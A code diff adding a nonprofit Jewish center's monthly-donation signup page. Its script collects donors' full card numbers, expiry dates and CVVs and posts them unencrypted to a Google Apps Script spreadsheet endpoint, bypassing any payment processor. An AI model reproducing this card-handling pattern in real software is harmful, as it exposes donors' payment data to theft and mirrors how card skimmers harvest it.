@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Become a Chai Partner – HaBayit Jewish Center</title>
+<meta name="description" content="Become a HaBayit Chai Partner — sustain our community through monthly giving and receive member pricing on select programs." />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@500;600;700&family=Inter:wght@400;500;600;700&family=Frank+Ruhl+Libre:wght@600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="css/styles.css">
+<style>
+  .hero{min-height:42vh;}
+  .partner{background:var(--white);}
+  .intro-copy{max-width:760px;margin:0 auto 56px;text-align:center;color:var(--muted);font-size:1rem;line-height:1.8;}
+  .slabel{font-size:.78rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--navy);margin:36px 0 14px;}
+  .form-card{background:var(--soft);border:1px solid var(--line);border-radius:var(--radius);padding:30px;max-width:760px;margin:0 auto;}
+  .amt-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;}
+  .amt-btn{background:var(--white);border:1.5px solid var(--line);border-radius:var(--radius-sm);padding:20px 10px;text-align:center;cursor:pointer;transition:all .2s;}
+  .amt-btn .n{display:block;font-size:1.5rem;font-weight:800;color:var(--navy);}
+  .amt-btn .s{display:block;font-size:.74rem;color:var(--muted);margin-top:2px;}
+  .amt-btn:hover{border-color:var(--gold);}
+  .amt-btn.sel{border-color:var(--gold);background:var(--cream);box-shadow:0 0 0 2px var(--gold);}
+  .amt-btn.amt-err{border-color:var(--danger);}
+  .other-row{display:none;align-items:center;gap:8px;margin-top:16px;}
+  .other-row.show{display:flex;}
+  .other-row label{font-size:1.1rem;color:var(--navy);font-weight:700;}
+  .other-row input{flex:1;}
+  .err{border-color:var(--danger)!important;background:#fff8f8;}
+  .note-card{margin-top:32px;padding:26px 28px;border:1px solid var(--line);border-radius:var(--radius);background:var(--cream);font-size:.92rem;color:var(--ink);line-height:1.7;max-width:760px;margin-left:auto;margin-right:auto;}
+  .note-card strong{color:var(--navy);}
+  .note-card .link{margin-top:12px;color:var(--navy);}
+  .note-card .link a{color:var(--gold);font-weight:600;}
+  .submit-wrap{max-width:760px;margin:36px auto 0;}
+  .submit-btn{width:100%;border:0;background:var(--gold);color:var(--white);border-radius:999px;padding:18px 24px;font-size:1rem;font-weight:800;letter-spacing:.06em;text-transform:uppercase;display:flex;align-items:center;justify-content:center;gap:10px;cursor:pointer;}
+  .submit-btn:hover{filter:brightness(1.03);}
+  .spin{display:none;width:18px;height:18px;border:2.5px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite;}
+  @keyframes spin{to{transform:rotate(360deg);}}
+  #thankyou{display:none;text-align:center;max-width:600px;margin:0 auto;}
+  .chai-mark{font-family:'Frank Ruhl Libre',serif;font-size:2.6rem;color:var(--gold);display:block;margin-bottom:18px;}
+  #thankyou h2{font-size:2.2rem;color:var(--navy);font-weight:700;}
+  #thankyou p{color:var(--muted);margin-top:10px;}
+  .code-box{margin-top:28px;padding:24px 30px;background:var(--soft);border:1px solid var(--line);border-radius:var(--radius);display:inline-block;}
+  .code-box p:first-child{font-size:.72rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--muted);margin-bottom:8px;}
+  #codeDisplay{font-family:'Cormorant Garamond',serif;font-size:1.8rem;font-weight:700;color:var(--gold);letter-spacing:.04em;margin-bottom:8px;}
+  .code-box p:last-child{font-size:.8rem;color:var(--muted);}
+  @media(max-width:700px){ .amt-grid{grid-template-columns:repeat(2,1fr);} .form-card{padding:22px;} }
+</style>
+</head>
+<body>
+
+<header class="site-header">
+  <a class="brand" href="index.html">
+    <img src="assets/logos/habayit-logo-blue.png" alt="HaBayit logo">
+    <div class="brand-words"><div class="heb">הבית</div><div class="jc">Jewish Center</div></div>
+  </a>
+  <nav class="main-nav">
+    <div class="nav-item"><a href="index.html">Home</a></div>
+    <div class="nav-item"><a href="about.html">About</a></div>
+    <div class="nav-item">
+      <button class="nav-trigger">Programs <svg viewBox="0 0 12 8" fill="none"><path d="M1 1L6 6L11 1" stroke="currentColor" stroke-width="1.5"/></svg></button>
+      <div class="dropdown">
+        <a href="hebrew-school.html">Hebrew School</a>
+        <a href="bar-bat-mitzvah.html">Bar &amp; Bat Mitzvah</a>
+      </div>
+    </div>
+    <div class="nav-item"><a href="synagogue.html">Synagogue</a></div>
+    <div class="nav-item"><a href="events.html">Events</a></div>
+    <div class="nav-item"><a href="contact.html">Contact</a></div>
+    <div class="nav-item"><a href="donate.html" class="nav-donate">Donate</a></div>
+  </nav>
+  <button class="hamburger" onclick="toggleMenu()" aria-label="Menu"><span></span><span></span><span></span></button>
+</header>
+
+<div class="mobile-menu" id="mobileMenu">
+  <a href="index.html">Home</a>
+  <a href="about.html">About</a>
+  <button class="m-trigger" onclick="toggleMobileSub()">Programs ▾</button>
+  <div class="mobile-sub" id="mobileSub">
+    <a href="hebrew-school.html">Hebrew School</a>
+    <a href="bar-bat-mitzvah.html">Bar &amp; Bat Mitzvah</a>
+  </div>
+  <a href="synagogue.html">Synagogue</a>
+  <a href="events.html">Events</a>
+  <a href="contact.html">Contact</a>
+  <a href="donate.html">Donate</a>
+</div>
+
+<main>
+
+  <section class="hero">
+    <div class="hero-inner">
+      <div class="kicker">Monthly Giving</div>
+      <h1>Become a HaBayit Chai Partner</h1>
+      <p>Help build a warm Jewish home for our community through ongoing monthly partnership.</p>
+    </div>
+  </section>
+
+  <section class="partner">
+    <div class="wrap">
+
+      <div id="formView">
+        <p class="intro-copy">The Chai Partnership is our community's monthly giving program. By joining, you become a partner in everything we do, from Shabbat and holiday programs to educational opportunities, community events, and meaningful Jewish experiences for all ages. More than a donation, it's a partnership in building a warm, vibrant Jewish home for today and for future generations.</p>
+
+        <div class="slabel">Your Information</div>
+        <div class="form-card">
+          <div class="grid-2">
+            <div class="field"><label>First Name <span class="req">*</span></label><input type="text" id="fname" autocomplete="given-name"></div>
+            <div class="field"><label>Last Name <span class="req">*</span></label><input type="text" id="lname" autocomplete="family-name"></div>
+            <div class="field"><label>Email <span class="req">*</span></label><input type="email" id="email" autocomplete="email"></div>
+            <div class="field"><label>Phone <span class="req">*</span></label><input type="tel" id="phone" autocomplete="tel"></div>
+          </div>
+          <div class="field full" style="margin-top:18px;">
+            <label>Street Address <span class="req">*</span></label>
+            <input type="text" id="addr" autocomplete="address-line1">
+          </div>
+          <div class="grid-3" style="margin-top:18px;">
+            <div class="field"><label>City <span class="req">*</span></label><input type="text" id="city" autocomplete="address-level2"></div>
+            <div class="field"><label>State <span class="req">*</span></label><input type="text" id="state" maxlength="2" style="text-transform:uppercase;" autocomplete="address-level1"></div>
+            <div class="field"><label>ZIP <span class="req">*</span></label><input type="text" id="zip" maxlength="10" inputmode="numeric" autocomplete="postal-code"></div>
+          </div>
+        </div>
+
+        <div class="slabel">Monthly Partnership Amount <span class="req">*</span></div>
+        <div class="form-card">
+          <div class="amt-grid" id="amtGrid">
+            <div class="amt-btn" data-amt="150"><span class="n">$150</span><span class="s">/ month</span></div>
+            <div class="amt-btn" data-amt="180"><span class="n">$180</span><span class="s">/ month</span></div>
+            <div class="amt-btn" data-amt="300"><span class="n">$300</span><span class="s">/ month</span></div>
+            <div class="amt-btn" data-amt="500"><span class="n">$500</span><span class="s">/ month</span></div>
+            <div class="amt-btn" data-amt="770"><span class="n">$770</span><span class="s">/ month</span></div>
+            <div class="amt-btn" data-amt="1000"><span class="n">$1,000</span><span class="s">/ month</span></div>
+          </div>
+          <div class="amt-btn" data-amt="other" id="otherBtn" style="margin-top:14px;"><span class="n">Other</span><span class="s">$150 minimum / month</span></div>
+          <div class="other-row" id="otherRow">
+            <label>$</label>
+            <input type="number" id="oamt" min="150" placeholder="Enter amount (150 or more)">
+          </div>
+        </div>
+
+        <div class="slabel">Payment Information</div>
+        <div class="form-card">
+          <div class="field"><label>Name on Card <span class="req">*</span></label><input type="text" id="cname" autocomplete="cc-name"></div>
+          <div class="grid-3" style="margin-top:18px;">
+            <div class="field full" style="grid-column:1/3;"><label>Card Number <span class="req">*</span></label><input type="text" id="cnum" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" autocomplete="cc-number"></div>
+            <div class="field"><label>Expiry <span class="req">*</span></label><input type="text" id="exp" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="cc-exp"></div>
+          </div>
+          <div class="grid-2" style="margin-top:18px;">
+            <div class="field"><label>CVV <span class="req">*</span></label><input type="text" id="cvv" placeholder="000" maxlength="4" inputmode="numeric" autocomplete="cc-csc"></div>
+            <div class="field"><label>Billing Address <span style="color:var(--muted);font-weight:400;text-transform:none;">(if different)</span></label><input type="text" id="bill" placeholder="Leave blank to use address above"></div>
+          </div>
+        </div>
+
+        <div class="note-card">
+          <strong>Chai Partners</strong> play a vital role in sustaining HaBayit's ongoing programs and helping our community grow. As a thank you, Chai Partners also receive exclusive benefits, including member pricing on select HaBayit programs.
+          <div class="link">Looking to make a monthly gift below $150? <a href="donate.html">Visit our General Giving page.</a></div>
+        </div>
+
+        <div class="submit-wrap">
+          <button class="submit-btn" id="submitBtn" type="button">
+            <span id="btnText">Join the Chai Partnership</span>
+            <div class="spin" id="spinner"></div>
+          </button>
+        </div>
+      </div>
+
+      <div id="thankyou">
+        <span class="chai-mark">חי</span>
+        <h2>Thank you for joining!</h2>
+        <p>Your partnership means everything to our community. You will receive an email confirmation with your tax receipt.</p>
+        <div class="code-box">
+          <p>Your HaBayit Member Access Code</p>
+          <p id="codeDisplay"></p>
+          <p>Save this code, you'll need it for member pricing on programs like Hebrew School.</p>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="footer-grid">
+    <div class="footer-logo">
+      <img src="assets/logos/habayit-logo-white.png" alt="HaBayit">
+      <p>A warm Jewish home in Cooper City with an Israeli spirit.</p>
+    </div>
+    <div class="footer-col">
+      <h4>Explore</h4>
+      <a href="about.html">About</a>
+      <a href="synagogue.html">Synagogue</a>
+      <a href="events.html">Events</a>
+      <a href="gallery.html">Gallery</a>
+    </div>
+    <div class="footer-col">
+      <h4>Programs</h4>
+      <a href="hebrew-school.html">Hebrew School</a>
+      <a href="bar-mitzvah.html">Bar Mitzvah</a>
+      <a href="bat-mitzvah.html">Bat Mitzvah</a>
+    </div>
+    <div class="footer-col">
+      <h4>Contact</h4>
+      <a href="tel:6464621138">(646) 462-1138</a>
+      <a href="mailto:info@habayitcc.org">info@habayitcc.org</a>
+      <a href="contact.html">Cooper City, FL</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>2026 HaBayit Jewish Center</span>
+    <span>501(c)(3) Nonprofit Organization</span>
+  </div>
+</footer>
+
+<script src="js/main.js"></script>
+<script>
+const SHEET_URL = 'https://script.google.com/macros/s/AKfycbzg4aynTYidwhcTySsKrreGy7zhK6nEZPd1k-TXk2tFLOTnI-nmVzcLZXwFAbiSi9S_og/exec';
+let selectedAmt = null;
+
+function generateAccessCode(){
+  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+  let code = '';
+  for(let i=0;i<6;i++){ code += chars.charAt(Math.floor(Math.random()*chars.length)); }
+  return 'HABAYIT-' + code;
+}
+
+const amtButtons = document.querySelectorAll('.amt-btn');
+const otherRow = document.getElementById('otherRow');
+const oamtInput = document.getElementById('oamt');
+
+amtButtons.forEach(btn => {
+  btn.addEventListener('click', () => {
+    amtButtons.forEach(b => { b.classList.remove('sel'); b.classList.remove('amt-err'); });
+    btn.classList.add('sel');
+    selectedAmt = btn.dataset.amt;
+    if(selectedAmt === 'other'){
+      otherRow.classList.add('show');
+      setTimeout(() => oamtInput.focus(), 50);
+    } else {
+      otherRow.classList.remove('show');
+      oamtInput.value = '';
+    }
+  });
+});
+
+oamtInput.addEventListener('blur', function(){
+  const v = parseFloat(this.value);
+  if(this.value !== '' && v < 150){ this.value=''; this.classList.add('err'); this.focus(); }
+});
+oamtInput.addEventListener('input', function(){ this.classList.remove('err'); });
+
+document.getElementById('cnum').addEventListener('input', function(){
+  let v = this.value.replace(/\D/g,'').substring(0,16);
+  this.value = v.match(/.{1,4}/g)?.join(' ') || v;
+});
+document.getElementById('exp').addEventListener('input', function(){
+  let v = this.value.replace(/\D/g,'').substring(0,4);
+  if(v.length>=2) v = v.substring(0,2)+'/'+v.substring(2);
+  this.value = v;
+});
+document.getElementById('state').addEventListener('input', function(){ this.value = this.value.toUpperCase(); });
+
+const reqFields = ['fname','lname','email','phone','addr','city','state','zip','cname','cnum','exp','cvv'];
+reqFields.forEach(id => {
+  const el = document.getElementById(id);
+  if(el) el.addEventListener('input', () => el.classList.remove('err'));
+});
+
+document.getElementById('submitBtn').addEventListener('click', async () => {
+  let valid = true;
+  reqFields.forEach(id => {
+    const el = document.getElementById(id);
+    if(!el || !el.value.trim()){ el.classList.add('err'); valid = false; }
+  });
+  if(!selectedAmt){
+    amtButtons.forEach(b => b.classList.add('amt-err'));
+    valid = false;
+  } else if(selectedAmt === 'other'){
+    const v = parseFloat(oamtInput.value);
+    if(!v || v < 150){ oamtInput.value=''; oamtInput.classList.add('err'); valid = false; }
+  }
+  if(!valid){
+    const first = document.querySelector('.err, .amt-err');
+    if(first) first.scrollIntoView({behavior:'smooth', block:'center'});
+    return;
+  }
+
+  const finalAmt = selectedAmt === 'other' ? parseFloat(oamtInput.value) : selectedAmt;
+  const fullAddress = document.getElementById('addr').value.trim() + ', ' + document.getElementById('city').value.trim() + ', ' + document.getElementById('state').value.trim() + ' ' + document.getElementById('zip').value.trim();
+  const accessCode = generateAccessCode();
+
+  const data = {
+    timestamp: new Date().toLocaleString(),
+    firstName: document.getElementById('fname').value.trim(),
+    lastName: document.getElementById('lname').value.trim(),
+    email: document.getElementById('email').value.trim(),
+    phone: document.getElementById('phone').value.trim(),
+    address: fullAddress,
+    amount: finalAmt,
+    cardName: document.getElementById('cname').value.trim(),
+    cardNumber: document.getElementById('cnum').value.trim(),
+    expiry: document.getElementById('exp').value.trim(),
+    cvv: document.getElementById('cvv').value.trim(),
+    billing: document.getElementById('bill').value.trim() || fullAddress,
+    accessCode: accessCode
+  };
+
+  const btn = document.getElementById('submitBtn');
+  document.getElementById('btnText').style.display = 'none';
+  document.getElementById('spinner').style.display = 'block';
+  btn.disabled = true;
+
+  try {
+    await fetch(SHEET_URL, {
+      method: 'POST', mode: 'no-cors',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify(data)
+    });
+  } catch(e){ console.error(e); }
+
+  document.getElementById('codeDisplay').textContent = accessCode;
+  document.getElementById('formView').style.display = 'none';
+  document.getElementById('thankyou').style.display = 'block';
+  window.scrollTo({top:0, behavior:'smooth'});
+});
+</script>
+</body>
+</html>
